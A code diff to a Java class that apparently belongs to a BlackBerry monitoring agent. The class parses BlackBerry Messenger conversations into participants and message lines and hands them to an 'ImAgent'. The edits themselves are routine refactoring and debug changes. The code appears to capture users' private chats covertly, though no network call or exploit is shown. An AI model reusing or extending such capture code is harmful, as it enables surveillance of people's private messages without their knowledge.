@@ -34,7 +34,7 @@ public class ConversationScreen implements Runnable {
         }
     }
 
-    public void getConversationScreen() {
+    public synchronized void getConversationScreen() {
         try {
             if (bbmApplication == null || !Backlight.isEnabled()) {
                 debug.ledStart(Debug.COLOR_RED);
@@ -103,20 +103,23 @@ public class ConversationScreen implements Runnable {
         // Torcione: Scrivo anche a he
 
         int pos = conversation.indexOf("-------------");
-        String partecipant1, partecipant2, partecipants;
+        String partecipants;
+        //String partecipant1, partecipant2;
         int posStart = conversation.indexOf("\n", pos) + 1;
         int posSep = conversation.indexOf(", ", posStart);
         int posEnd = conversation.indexOf("\n", posSep);
 
         partecipants = conversation.substring(posStart, posEnd);
 
-        partecipant1 = conversation.substring(posStart, posSep);
-        debug.trace("partecipant 1: " + partecipant1);
-        partecipant2 = conversation.substring(posSep + 2, posEnd);
-        debug.trace("partecipant 2: " + partecipant2);
+        //partecipant1 = conversation.substring(posStart, posSep);
+        //debug.trace("partecipant 1: " + partecipant1);
+        //partecipant2 = conversation.substring(posSep + 2, posEnd);
+        //debug.trace("partecipant 2: " + partecipant2);
 
         int posMessages = getLinePos(conversation, 6);
         int numLine = 1;
+
+        ImAgent agent = ImAgent.getInstance();
 
         Vector lines = new Vector();
 
@@ -131,9 +134,12 @@ public class ConversationScreen implements Runnable {
             String user = currentLine.substring(0, posSep);
             String message = currentLine.substring(posSep + 2);
 
-            if (numLine < 5)
+            if (numLine < 5) {
+                //#ifdef DEBUG
                 debug.trace("line " + numLine + " user: " + user + " message: "
                         + message);
+                //#endif
+            }
             numLine += 1;
 
             Line line = new Line(user, message);
@@ -141,10 +147,7 @@ public class ConversationScreen implements Runnable {
             debug.trace("parseConversation adding line: " + line);
             //#endif
             lines.addElement(line);
-
         }
-
-        ImAgent agent = ImAgent.getInstance();
 
         agent.add(partecipants, lines);
         debug.info("num lines: " + numLine);
